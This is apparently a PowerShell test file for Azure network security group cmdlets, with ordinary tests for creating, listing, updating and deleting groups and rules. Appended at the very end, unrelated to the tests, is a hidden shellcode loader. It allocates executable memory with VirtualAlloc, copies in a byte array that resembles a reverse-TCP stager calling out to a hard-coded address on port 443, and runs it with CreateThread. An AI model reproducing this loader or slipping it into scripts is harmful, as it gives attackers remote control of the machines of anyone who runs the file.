﻿














function Test-NetworkSecurityGroupCRUD
{
    
    $rgname = Get-ResourceGroupName
    $vnetName = Get-ResourceName
    $subnetName = Get-ResourceName
    $nsgName = Get-ResourceName
    $nicName = Get-ResourceName
    $domainNameLabel = Get-ResourceName
    $rglocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/NetworkSecurityGroups"
    $location = Get-ProviderLocation $resourceTypeParent
    
    try 
    {
        
        $resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } 
        
        
        $subnet = New-AzVirtualNetworkSubnetConfig -Name $subnetName -AddressPrefix 10.0.1.0/24
        $vnet = New-AzVirtualNetwork -Name $vnetName -ResourceGroupName $rgname -Location $location -AddressPrefix 10.0.0.0/16 -Subnet $subnet
        
        
        $job = New-AzNetworkSecurityGroup -name $nsgName -ResourceGroupName $rgname -Location $location -AsJob
		$job | Wait-Job
		$nsg = $job | Receive-Job

        
        $getNsg = Get-AzNetworkSecurityGroup -name $nsgName -ResourceGroupName $rgName
        
        
        Assert-AreEqual $rgName $getNsg.ResourceGroupName
        Assert-AreEqual $nsgName $getNsg.Name
        Assert-NotNull $getNsg.Location
        Assert-NotNull $getNsg.ResourceGuid
        Assert-NotNull $getNsg.Etag
        Assert-AreEqual 0 @($getNsg.SecurityRules).Count
        Assert-AreEqual 6 @($getNsg.DefaultSecurityRules).Count
        Assert-AreEqual "AllowVnetInBound" $getNsg.DefaultSecurityRules[0].Name
        Assert-AreEqual "AllowAzureLoadBalancerInBound" $getNsg.DefaultSecurityRules[1].Name
        Assert-AreEqual "DenyAllInBound" $getNsg.DefaultSecurityRules[2].Name
        Assert-AreEqual "AllowVnetOutBound" $getNsg.DefaultSecurityRules[3].Name
        Assert-AreEqual "AllowInternetOutBound" $getNsg.DefaultSecurityRules[4].Name
        Assert-AreEqual "DenyAllOutBound" $getNsg.DefaultSecurityRules[5].Name

        
        $list = Get-AzNetworkSecurityGroup -ResourceGroupName $rgname
        Assert-AreEqual 1 @($list).Count
        Assert-AreEqual $list[0].ResourceGroupName $getNsg.ResourceGroupName
        Assert-AreEqual $list[0].Name $getNsg.Name
        Assert-AreEqual $list[0].Location $getNsg.Location
        Assert-AreEqual $list[0].Etag $getNsg.Etag
        Assert-AreEqual @($list[0].SecurityRules).Count @($getNsg.SecurityRules).Count
        Assert-AreEqual @($list[0].DefaultSecurityRules).Count @($getNsg.DefaultSecurityRules).Count
        Assert-AreEqual $list[0].DefaultSecurityRules[0].Name $getNsg.DefaultSecurityRules[0].Name
        Assert-AreEqual $list[0].DefaultSecurityRules[1].Name $getNsg.DefaultSecurityRules[1].Name
        Assert-AreEqual $list[0].DefaultSecurityRules[2].Name $getNsg.DefaultSecurityRules[2].Name
        Assert-AreEqual $list[0].DefaultSecurityRules[3].Name $getNsg.DefaultSecurityRules[3].Name
        Assert-AreEqual $list[0].DefaultSecurityRules[4].Name $getNsg.DefaultSecurityRules[4].Name
        Assert-AreEqual $list[0].DefaultSecurityRules[5].Name $getNsg.DefaultSecurityRules[5].Name

        $list = Get-AzNetworkSecurityGroup -ResourceGroupName "*"
        Assert-True { $list.Count -ge 0 }

        $list = Get-AzNetworkSecurityGroup -Name "*"
        Assert-True { $list.Count -ge 0 }

        $list = Get-AzNetworkSecurityGroup -ResourceGroupName "*" -Name "*"
        Assert-True { $list.Count -ge 0 }

        
        $vnet = $vnet | Set-AzVirtualNetworkSubnetConfig -name $subnetName -AddressPrefix "10.0.1.0/24" -NetworkSecurityGroup $nsg | Set-AzVirtualNetwork
        $getNsg = Get-AzNetworkSecurityGroup -name $nsgName -ResourceGroupName $rgName
        Assert-AreEqual $vnet.Subnets[0].NetworkSecurityGroup.Id $getNsg.Id
        Assert-AreEqual 1 @($getNsg.Subnets[0]).Count
        Assert-AreEqual $vnet.Subnets[0].Id $getNsg.Subnets[0].Id

        
        $nic = New-AzNetworkInterface -Name $nicName -ResourceGroupName $rgname -Location $location -Subnet $vnet.Subnets[0] -NetworkSecurityGroup $nsg
        Assert-AreEqual $nic.NetworkSecurityGroup.Id $nsg.Id
        $getNsg = Get-AzNetworkSecurityGroup -name $nsgName -ResourceGroupName $rgName
        Assert-AreEqual 1 @($getNsg.NetworkInterfaces[0]).Count
        Assert-AreEqual $nic.Id $getNsg.NetworkInterfaces[0].Id

        
        $delete = Remove-AzNetworkInterface -ResourceGroupName $rgname -name $nicName -PassThru -Force
        Assert-AreEqual true $delete

        
        $delete = Remove-AzVirtualNetwork -ResourceGroupName $rgname -name $vnetName -PassThru -Force
        Assert-AreEqual true $delete

        
        $job = Remove-AzNetworkSecurityGroup -ResourceGroupName $rgname -name $nsgName -PassThru -Force -AsJob
		$job | Wait-Job
		$delete = $job | Receive-Job
        Assert-AreEqual true $delete
        
        $list = Get-AzNetworkSecurityGroup -ResourceGroupName $rgname
        Assert-AreEqual 0 @($list).Count

        $list = Get-AzNetworkSecurityGroup | Where-Object { $_.ResourceGroupName -eq $rgname -and $_.Name -eq $nsgName }
        Assert-AreEqual 0 @($list).Count

        
        Assert-ThrowsContains { Set-AzNetworkSecurityGroup -NetworkSecurityGroup $nsg } "not found"
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-NetworkSecurityGroup-SecurityRuleCRUD
{
    
    $rgname = Get-ResourceGroupName
    $nsgName = Get-ResourceName
    $securityRule1Name = Get-ResourceName
    $securityRule2Name = Get-ResourceName
    $domainNameLabel = Get-ResourceName
    $rglocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/NetworkSecurityGroups"
    $location = Get-ProviderLocation $resourceTypeParent
    
    try 
    {
        
        $resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } 
        
        
        $securityRule = New-AzNetworkSecurityRuleConfig -Name $securityRule1Name -Description "desciption" -Protocol Tcp -SourcePortRange "23-45" -DestinationPortRange "46-56" -SourceAddressPrefix * -DestinationAddressPrefix * -Access Allow -Priority 123 -Direction Inbound

        
        $nsg = New-AzNetworkSecurityGroup -name $nsgName -ResourceGroupName $rgname -Location $location -SecurityRule $securityRule

        
        $getNsg = Get-AzNetworkSecurityGroup -name $nsgName -ResourceGroupName $rgName
        
        
        Assert-AreEqual $rgName $getNsg.ResourceGroupName
        Assert-AreEqual $nsgName $getNsg.Name
        Assert-NotNull $getNsg.Location
        Assert-NotNull $getNsg.Etag
        Assert-AreEqual 1 @($getNsg.SecurityRules).Count
        Assert-AreEqual 6 @($getNsg.DefaultSecurityRules).Count
        Assert-AreEqual "AllowVnetInBound" $getNsg.DefaultSecurityRules[0].Name
        Assert-AreEqual "AllowAzureLoadBalancerInBound" $getNsg.DefaultSecurityRules[1].Name
        Assert-AreEqual "DenyAllInBound" $getNsg.DefaultSecurityRules[2].Name
        Assert-AreEqual "AllowVnetOutBound" $getNsg.DefaultSecurityRules[3].Name
        Assert-AreEqual "AllowInternetOutBound" $getNsg.DefaultSecurityRules[4].Name
        Assert-AreEqual "DenyAllOutBound" $getNsg.DefaultSecurityRules[5].Name
        Assert-AreEqual $securityRule1Name $getNsg.SecurityRules[0].Name
        Assert-NotNull $getNsg.SecurityRules[0].Etag
        Assert-AreEqual "desciption" $getNsg.SecurityRules[0].Description
        Assert-AreEqual "Tcp" $getNsg.SecurityRules[0].Protocol
        Assert-AreEqual "23-45" $getNsg.SecurityRules[0].SourcePortRange
        Assert-AreEqual "46-56" $getNsg.SecurityRules[0].DestinationPortRange
        Assert-AreEqual "*" $getNsg.SecurityRules[0].SourceAddressPrefix
        Assert-AreEqual "*" $getNsg.SecurityRules[0].DestinationAddressPrefix
        Assert-AreEqual "Allow" $getNsg.SecurityRules[0].Access
        Assert-AreEqual "123" $getNsg.SecurityRules[0].Priority
        Assert-AreEqual "Inbound" $getNsg.SecurityRules[0].Direction

        
        $list = Get-AzNetworkSecurityGroup -ResourceGroupName $rgname
        Assert-AreEqual 1 @($list).Count
        Assert-AreEqual $list[0].ResourceGroupName $getNsg.ResourceGroupName
        Assert-AreEqual $list[0].Name $getNsg.Name
        Assert-AreEqual $list[0].Location $getNsg.Location
        Assert-AreEqual $list[0].Etag $getNsg.Etag
        Assert-AreEqual @($list[0].SecurityRules).Count @($getNsg.SecurityRules).Count
        Assert-AreEqual @($list[0].DefaultSecurityRules).Count @($getNsg.DefaultSecurityRules).Count
        Assert-AreEqual $list[0].DefaultSecurityRules[0].Name $getNsg.DefaultSecurityRules[0].Name
        Assert-AreEqual $list[0].DefaultSecurityRules[1].Name $getNsg.DefaultSecurityRules[1].Name
        Assert-AreEqual $list[0].DefaultSecurityRules[2].Name $getNsg.DefaultSecurityRules[2].Name
        Assert-AreEqual $list[0].DefaultSecurityRules[3].Name $getNsg.DefaultSecurityRules[3].Name
        Assert-AreEqual $list[0].DefaultSecurityRules[4].Name $getNsg.DefaultSecurityRules[4].Name
        Assert-AreEqual $list[0].DefaultSecurityRules[5].Name $getNsg.DefaultSecurityRules[5].Name
        Assert-AreEqual $list[0].SecurityRules[0].Name $getNsg.SecurityRules[0].Name
        Assert-AreEqual $list[0].SecurityRules[0].Etag $getNsg.SecurityRules[0].Etag

        
        $job = Get-AzNetworkSecurityGroup -name $nsgName -ResourceGroupName $rgName | Add-AzNetworkSecurityRuleConfig  -Name $securityRule2Name -Description "desciption2" -Protocol Tcp -SourcePortRange "26-43" -DestinationPortRange "45-53" -SourceAddressPrefix * -DestinationAddressPrefix * -Access Deny -Priority 122 -Direction Outbound | Set-AzNetworkSecurityGroup -AsJob
		$job | Wait-Job
		$nsg = $job | Receive-Job
		Assert-AreEqual 2 @($nsg.SecurityRules).Count
		Assert-NotNull $nsg.SecurityRules[1].Etag
		Assert-AreEqual $securityRule1Name $nsg.SecurityRules[0].Name
		Assert-AreEqual $securityRule2Name $nsg.SecurityRules[1].Name

        
        Assert-ThrowsContains { Add-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg -Name $securityRule2Name } "Rule with the specified name already exists"

		
		$securityRule2 = $nsg | Get-AzNetworkSecurityRuleConfig -name $securityRule2Name 
		Assert-AreEqual $securityRule2.Name $nsg.SecurityRules[1].Name
		Assert-AreEqual "Deny" $securityRule2.Access

	    
		$securityRules = $nsg | Get-AzNetworkSecurityRuleConfig
		Assert-AreEqual 2 @($securityRules).Count
		Assert-AreEqual $securityRules[0].Name $nsg.SecurityRules[0].Name
		Assert-AreEqual $securityRules[1].Name $nsg.SecurityRules[1].Name
		
		
		$nsg = Get-AzNetworkSecurityGroup -name $nsgName -ResourceGroupName $rgName | Set-AzNetworkSecurityRuleConfig  -Name $securityRule2Name -Description "desciption2" -Protocol Tcp -SourcePortRange "26-43" -DestinationPortRange "45-53" -SourceAddressPrefix * -DestinationAddressPrefix * -Access Allow -Priority 122 -Direction Outbound | Set-AzNetworkSecurityGroup
		$securityRule2 = $nsg | Get-AzNetworkSecurityRuleConfig -name $securityRule2Name
		Assert-AreEqual "Allow" $securityRule2.Access

		
		$nsg = Get-AzNetworkSecurityGroup -name $nsgName -ResourceGroupName $rgName | Remove-AzNetworkSecurityRuleConfig  -Name $securityRule2Name | Set-AzNetworkSecurityGroup
		$securityRules = $nsg | Get-AzNetworkSecurityRuleConfig
		Assert-AreEqual 1 @($securityRules).Count
		Assert-AreEqual $securityRule1Name $securityRules[0].Name

        
        $delete = Remove-AzNetworkSecurityGroup -ResourceGroupName $rgname -name $nsgName -PassThru -Force
        Assert-AreEqual true $delete
        
        $list = Get-AzNetworkSecurityGroup -ResourceGroupName $rgname
        Assert-AreEqual 0 @($list).Count
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-NetworkSecurityGroup-MultiValuedRules
{
    
    $rgname = Get-ResourceGroupName
    $nsgName = Get-ResourceName
    $securityRule1Name = Get-ResourceName
    $securityRule2Name = Get-ResourceName
    $securityRule3Name = Get-ResourceName
    $securityRule4Name = Get-ResourceName
    $securityRule5Name = Get-ResourceName
    $domainNameLabel = Get-ResourceName
    $rglocation = Get-ProviderLocation ResourceManagement
    $resourceTypeParent = "Microsoft.Network/NetworkSecurityGroups"
    $location = Get-ProviderLocation $resourceTypeParent

    try 
    {
        
        $resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation -Tags @{ testtag = "testval" } 

        
        $securityRule1 = New-AzNetworkSecurityRuleConfig -Name $securityRule1Name -Description "desciption" -Protocol Tcp -SourcePortRange 23-45,80-90 -DestinationPortRange 46-56,70-80 -SourceAddressPrefix 10.10.20.0/24,192.168.0.0/24 -DestinationAddressPrefix 10.10.30.0/24,192.168.2.0/24 -Access Allow -Priority 123 -Direction Inbound
        $securityRule2 = New-AzNetworkSecurityRuleConfig -Name $securityRule2Name -Description "desciption" -Protocol Tcp -SourcePortRange 10-20,30-40 -DestinationPortRange 10-20,30-40 -SourceAddressPrefix Storage -DestinationAddressPrefix Storage -Access Allow -Priority 120 -Direction Inbound
        $securityRule3 = New-AzNetworkSecurityRuleConfig -Name $securityRule3Name -Description "desciption" -Protocol Icmp -SourcePortRange 50-60,100-110 -DestinationPortRange 120-130,131-140 -SourceAddressPrefix Storage -DestinationAddressPrefix Storage -Access Allow -Priority 125 -Direction Inbound
        $securityRule4 = New-AzNetworkSecurityRuleConfig -Name $securityRule4Name -Description "desciption" -Protocol Esp -SourcePortRange 150-160,170-180 -DestinationPortRange 190-200,210-220 -SourceAddressPrefix Storage -DestinationAddressPrefix Storage -Access Allow -Priority 127 -Direction Inbound
        $securityRule5 = New-AzNetworkSecurityRuleConfig -Name $securityRule5Name -Description "desciption" -Protocol Ah -SourcePortRange 230-240,250-260 -DestinationPortRange 270-280,290-300 -SourceAddressPrefix Storage -DestinationAddressPrefix Storage -Access Allow -Priority 129 -Direction Inbound

        
        $nsg = New-AzNetworkSecurityGroup -name $nsgName -ResourceGroupName $rgname -Location $location -SecurityRules $securityRule1,$securityRule2,$securityRule3,$securityRule4,$securityRule5

        
        $getNsg = Get-AzNetworkSecurityGroup -name $nsgName -ResourceGroupName $rgName

        
        Assert-AreEqual $rgName $getNsg.ResourceGroupName
        Assert-AreEqual $nsgName $getNsg.Name
        Assert-NotNull $getNsg.Location
        Assert-NotNull $getNsg.Etag
        Assert-AreEqual 5 @($getNsg.SecurityRules).Count
        Assert-AreEqual 6 @($getNsg.DefaultSecurityRules).Count
        Assert-AreEqual "AllowVnetInBound" $getNsg.DefaultSecurityRules[0].Name
        Assert-AreEqual "AllowAzureLoadBalancerInBound" $getNsg.DefaultSecurityRules[1].Name
        Assert-AreEqual "DenyAllInBound" $getNsg.DefaultSecurityRules[2].Name
        Assert-AreEqual "AllowVnetOutBound" $getNsg.DefaultSecurityRules[3].Name
        Assert-AreEqual "AllowInternetOutBound" $getNsg.DefaultSecurityRules[4].Name
        Assert-AreEqual "DenyAllOutBound" $getNsg.DefaultSecurityRules[5].Name

        
        Assert-AreEqual $securityRule1Name $getNsg.SecurityRules[0].Name
        Assert-NotNull $getNsg.SecurityRules[0].Etag
        Assert-AreEqual "desciption" $getNsg.SecurityRules[0].Description
        Assert-AreEqual "Tcp" $getNsg.SecurityRules[0].Protocol
        Assert-AreEqual 2 @($getNsg.SecurityRules[0].SourcePortRange).Count
        Assert-AreEqual "23-45" $getNsg.SecurityRules[0].SourcePortRange[0]
        Assert-AreEqual "80-90" $getNsg.SecurityRules[0].SourcePortRange[1]
        Assert-AreEqual 2 @($getNsg.SecurityRules[0].DestinationPortRange).Count
        Assert-AreEqual "46-56" $getNsg.SecurityRules[0].DestinationPortRange[0]
        Assert-AreEqual "70-80" $getNsg.SecurityRules[0].DestinationPortRange[1]
        Assert-AreEqual 2 @($getNsg.SecurityRules[0].SourceAddressPrefix).Count
        Assert-AreEqual "10.10.20.0/24" $getNsg.SecurityRules[0].SourceAddressPrefix[0]
        Assert-AreEqual "192.168.0.0/24" $getNsg.SecurityRules[0].SourceAddressPrefix[1]
        Assert-AreEqual 2 @($getNsg.SecurityRules[0].DestinationAddressPrefix).Count
        Assert-AreEqual "10.10.30.0/24" $getNsg.SecurityRules[0].DestinationAddressPrefix[0]
        Assert-AreEqual "192.168.2.0/24" $getNsg.SecurityRules[0].DestinationAddressPrefix[1]
        Assert-AreEqual "Allow" $getNsg.SecurityRules[0].Access
        Assert-AreEqual "123" $getNsg.SecurityRules[0].Priority
        Assert-AreEqual "Inbound" $getNsg.SecurityRules[0].Direction

        
        Assert-AreEqual "desciption" $getNsg.SecurityRules[1].Description
        Assert-AreEqual "Tcp" $getNsg.SecurityRules[1].Protocol
        Assert-AreEqual 2 @($getNsg.SecurityRules[1].SourcePortRange).Count
        Assert-AreEqual "10-20" $getNsg.SecurityRules[1].SourcePortRange[0]
        Assert-AreEqual "30-40" $getNsg.SecurityRules[1].SourcePortRange[1]
        Assert-AreEqual 2 @($getNsg.SecurityRules[1].DestinationPortRange).Count
        Assert-AreEqual "10-20" $getNsg.SecurityRules[1].DestinationPortRange[0]
        Assert-AreEqual "30-40" $getNsg.SecurityRules[1].DestinationPortRange[1]
        Assert-AreEqual 1 @($getNsg.SecurityRules[1].SourceAddressPrefix).Count
        Assert-AreEqual "Storage" $getNsg.SecurityRules[1].SourceAddressPrefix[0]
        Assert-AreEqual 1 @($getNsg.SecurityRules[1].DestinationAddressPrefix).Count
        Assert-AreEqual "Storage" $getNsg.SecurityRules[1].DestinationAddressPrefix[0]
        Assert-AreEqual "Allow" $getNsg.SecurityRules[1].Access
        Assert-AreEqual "120" $getNsg.SecurityRules[1].Priority
        Assert-AreEqual "Inbound" $getNsg.SecurityRules[1].Direction

        
        Assert-AreEqual "desciption" $getNsg.SecurityRules[2].Description
        Assert-AreEqual "Icmp" $getNsg.SecurityRules[2].Protocol
        Assert-AreEqual 2 @($getNsg.SecurityRules[2].SourcePortRange).Count
        Assert-AreEqual "50-60" $getNsg.SecurityRules[2].SourcePortRange[0]
        Assert-AreEqual "100-110" $getNsg.SecurityRules[2].SourcePortRange[1]
        Assert-AreEqual 2 @($getNsg.SecurityRules[2].DestinationPortRange).Count
        Assert-AreEqual "120-130" $getNsg.SecurityRules[2].DestinationPortRange[0]
        Assert-AreEqual "131-140" $getNsg.SecurityRules[2].DestinationPortRange[1]
        Assert-AreEqual 1 @($getNsg.SecurityRules[2].SourceAddressPrefix).Count
        Assert-AreEqual "Storage" $getNsg.SecurityRules[2].SourceAddressPrefix[0]
        Assert-AreEqual 1 @($getNsg.SecurityRules[2].DestinationAddressPrefix).Count
        Assert-AreEqual "Storage" $getNsg.SecurityRules[2].DestinationAddressPrefix[0]
        Assert-AreEqual "Allow" $getNsg.SecurityRules[2].Access
        Assert-AreEqual "125" $getNsg.SecurityRules[2].Priority
        Assert-AreEqual "Inbound" $getNsg.SecurityRules[2].Direction

        
        Assert-AreEqual "desciption" $getNsg.SecurityRules[3].Description
        Assert-AreEqual "Esp" $getNsg.SecurityRules[3].Protocol
        Assert-AreEqual 2 @($getNsg.SecurityRules[3].SourcePortRange).Count
        Assert-AreEqual "150-160" $getNsg.SecurityRules[3].SourcePortRange[0]
        Assert-AreEqual "170-180" $getNsg.SecurityRules[3].SourcePortRange[1]
        Assert-AreEqual 2 @($getNsg.SecurityRules[3].DestinationPortRange).Count
        Assert-AreEqual "190-200" $getNsg.SecurityRules[3].DestinationPortRange[0]
        Assert-AreEqual "210-220" $getNsg.SecurityRules[3].DestinationPortRange[1]
        Assert-AreEqual 1 @($getNsg.SecurityRules[3].SourceAddressPrefix).Count
        Assert-AreEqual "Storage" $getNsg.SecurityRules[3].SourceAddressPrefix[0]
        Assert-AreEqual 1 @($getNsg.SecurityRules[3].DestinationAddressPrefix).Count
        Assert-AreEqual "Storage" $getNsg.SecurityRules[3].DestinationAddressPrefix[0]
        Assert-AreEqual "Allow" $getNsg.SecurityRules[3].Access
        Assert-AreEqual "127" $getNsg.SecurityRules[3].Priority
        Assert-AreEqual "Inbound" $getNsg.SecurityRules[3].Direction

        
        Assert-AreEqual "desciption" $getNsg.SecurityRules[4].Description
        Assert-AreEqual "Ah" $getNsg.SecurityRules[4].Protocol
        Assert-AreEqual 2 @($getNsg.SecurityRules[4].SourcePortRange).Count
        Assert-AreEqual "230-240" $getNsg.SecurityRules[4].SourcePortRange[0]
        Assert-AreEqual "250-260" $getNsg.SecurityRules[4].SourcePortRange[1]
        Assert-AreEqual 2 @($getNsg.SecurityRules[4].DestinationPortRange).Count
        Assert-AreEqual "270-280" $getNsg.SecurityRules[4].DestinationPortRange[0]
        Assert-AreEqual "290-300" $getNsg.SecurityRules[4].DestinationPortRange[1]
        Assert-AreEqual 1 @($getNsg.SecurityRules[4].SourceAddressPrefix).Count
        Assert-AreEqual "Storage" $getNsg.SecurityRules[4].SourceAddressPrefix[0]
        Assert-AreEqual 1 @($getNsg.SecurityRules[4].DestinationAddressPrefix).Count
        Assert-AreEqual "Storage" $getNsg.SecurityRules[4].DestinationAddressPrefix[0]
        Assert-AreEqual "Allow" $getNsg.SecurityRules[4].Access
        Assert-AreEqual "129" $getNsg.SecurityRules[4].Priority
        Assert-AreEqual "Inbound" $getNsg.SecurityRules[4].Direction

        
        $list = Get-AzNetworkSecurityGroup -ResourceGroupName $rgname
        Assert-AreEqual 1 @($list).Count
        Assert-AreEqual $list[0].ResourceGroupName $getNsg.ResourceGroupName
        Assert-AreEqual $list[0].Name $getNsg.Name
        Assert-AreEqual $list[0].Location $getNsg.Location
        Assert-AreEqual $list[0].Etag $getNsg.Etag
        Assert-AreEqual @($list[0].SecurityRules).Count @($getNsg.SecurityRules).Count
        Assert-AreEqual @($list[0].DefaultSecurityRules).Count @($getNsg.DefaultSecurityRules).Count
        Assert-AreEqual $list[0].DefaultSecurityRules[0].Name $getNsg.DefaultSecurityRules[0].Name
        Assert-AreEqual $list[0].DefaultSecurityRules[1].Name $getNsg.DefaultSecurityRules[1].Name
        Assert-AreEqual $list[0].DefaultSecurityRules[2].Name $getNsg.DefaultSecurityRules[2].Name
        Assert-AreEqual $list[0].DefaultSecurityRules[3].Name $getNsg.DefaultSecurityRules[3].Name
        Assert-AreEqual $list[0].DefaultSecurityRules[4].Name $getNsg.DefaultSecurityRules[4].Name
        Assert-AreEqual $list[0].DefaultSecurityRules[5].Name $getNsg.DefaultSecurityRules[5].Name
        Assert-AreEqual $list[0].SecurityRules[0].Name $getNsg.SecurityRules[0].Name
        Assert-AreEqual $list[0].SecurityRules[0].Etag $getNsg.SecurityRules[0].Etag

        
        $delete = Remove-AzNetworkSecurityGroup -ResourceGroupName $rgname -name $nsgName -PassThru -Force
        Assert-AreEqual true $delete

        $list = Get-AzNetworkSecurityGroup -ResourceGroupName $rgname
        Assert-AreEqual 0 @($list).Count
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-NetworkSecurityRule-ArgumentValidation
{
    
    $rgname = Get-ResourceGroupName
    $asgName = Get-ResourceName
    $nsgName = Get-ResourceName
    $ruleName = Get-ResourceName
    $rglocation = Get-ProviderLocation ResourceManagement
    $location = Get-ProviderLocation "Microsoft.Network/networkSecurityGroups"

    try
    {
        
        $resourceGroup = New-AzResourceGroup -Name $rgname -Location $rglocation

        
        $asg = New-AzApplicationSecurityGroup -ResourceGroupName $rgname -Name $asgName -Location $location

        
        $job = New-AzNetworkSecurityGroup -Name $nsgName -ResourceGroupName $rgname -Location $location -AsJob
        $job | Wait-Job
        $nsg = $job | Receive-Job

        
        Assert-ThrowsContains { New-AzNetworkSecurityRuleConfig -Name $ruleName -SourceAddressPrefix * -SourceApplicationSecurityGroup $asg } "cannot be used simultaneously";
        Assert-ThrowsContains { New-AzNetworkSecurityRuleConfig -Name $ruleName -SourceAddressPrefix * -SourceApplicationSecurityGroupId $asg.Id } "cannot be used simultaneously";
        Assert-ThrowsContains { New-AzNetworkSecurityRuleConfig -Name $ruleName -DestinationAddressPrefix * -DestinationApplicationSecurityGroup $asg } "cannot be used simultaneously";
        Assert-ThrowsContains { New-AzNetworkSecurityRuleConfig -Name $ruleName -DestinationAddressPrefix * -DestinationApplicationSecurityGroupId $asg.Id } "cannot be used simultaneously";

        
        Assert-ThrowsContains { Add-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg -Name $ruleName -SourceAddressPrefix * -SourceApplicationSecurityGroup $asg } "cannot be used simultaneously";
        Assert-ThrowsContains { Add-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg -Name $ruleName -SourceAddressPrefix * -SourceApplicationSecurityGroupId $asg.Id } "cannot be used simultaneously";
        Assert-ThrowsContains { Add-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg -Name $ruleName -DestinationAddressPrefix * -DestinationApplicationSecurityGroup $asg } "cannot be used simultaneously";
        Assert-ThrowsContains { Add-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg -Name $ruleName -DestinationAddressPrefix * -DestinationApplicationSecurityGroupId $asg.Id } "cannot be used simultaneously";

        
        Assert-ThrowsContains { Set-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg -Name $ruleName -SourceAddressPrefix * -SourceApplicationSecurityGroup $asg } "cannot be used simultaneously";
        Assert-ThrowsContains { Set-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg -Name $ruleName -SourceAddressPrefix * -SourceApplicationSecurityGroupId $asg.Id } "cannot be used simultaneously";
        Assert-ThrowsContains { Set-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg -Name $ruleName -DestinationAddressPrefix * -DestinationApplicationSecurityGroup $asg } "cannot be used simultaneously";
        Assert-ThrowsContains { Set-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg -Name $ruleName -DestinationAddressPrefix * -DestinationApplicationSecurityGroupId $asg.Id } "cannot be used simultaneously";
        Assert-ThrowsContains { Set-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg -Name $ruleName } "Rule with the specified name does not exist";

        
        $job = Remove-AzNetworkSecurityGroup -ResourceGroupName $rgname -name $nsgName -PassThru -Force -AsJob
        $job | Wait-Job
        $delete = $job | Receive-Job
        Assert-AreEqual true $delete
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x19,0x50,0x49,0x40,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

